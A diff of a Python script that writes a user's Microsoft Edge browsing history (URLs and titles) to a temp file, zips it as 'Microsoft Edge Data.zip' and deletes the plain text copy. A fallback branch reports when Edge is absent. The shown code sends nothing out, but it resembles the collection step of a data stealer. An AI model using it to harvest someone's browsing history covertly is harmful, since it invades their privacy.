@@ -26,18 +26,28 @@ temp_dir = tempfile.gettempdir()
 # Create the file path for edge_history.txt in the temporary directory
 edge_file = Path(temp_dir) / "edge_history.txt"
 
-with open(edge_file, "w", encoding="utf-8") as file:
-    file.write("Edge History:\n")
-    for url, title in edge_history:
-        file.write(f"URL: {url}\n")
-        file.write(f"Title: {title}\n\n")
+if edge_history:
+    with open(edge_file, "w", encoding="utf-8") as file:
+        file.write("Edge History:\n")
+        for url, title in edge_history:
+            file.write(f"URL: {url}\n")
+            file.write(f"Title: {title}\n\n")
 
-# Create the path for the ZIP archive
-zip_file = Path(temp_dir) / "Microsoft Edge Data.zip"
+    # Create the path for the ZIP archive
+    zip_file = Path(temp_dir) / "Microsoft Edge Data.zip"
 
-# Create a ZIP archive and add the edge_history.txt file to it
-with zipfile.ZipFile(zip_file, "w") as zipf:
-    zipf.write(edge_file, "edge_history.txt")
+    # Create a ZIP archive and add the edge_history.txt file to it
+    with zipfile.ZipFile(zip_file, "w") as zipf:
+        zipf.write(edge_file, "edge_history.txt")
 
-# Delete the edge_history.txt file
-edge_file.unlink()
+    # Delete the edge_history.txt file
+    edge_file.unlink()
+
+    print("Edge history saved to", zip_file)
+else:
+    output_file = Path(temp_dir) / "browser_history.txt"
+
+    with open(output_file, "w", encoding="utf-8") as file:
+        file.write("Microsoft Edge is not found/used on this PC.")
+    
+    print("Microsoft Edge is not found/used on this PC. Output file:", output_file)
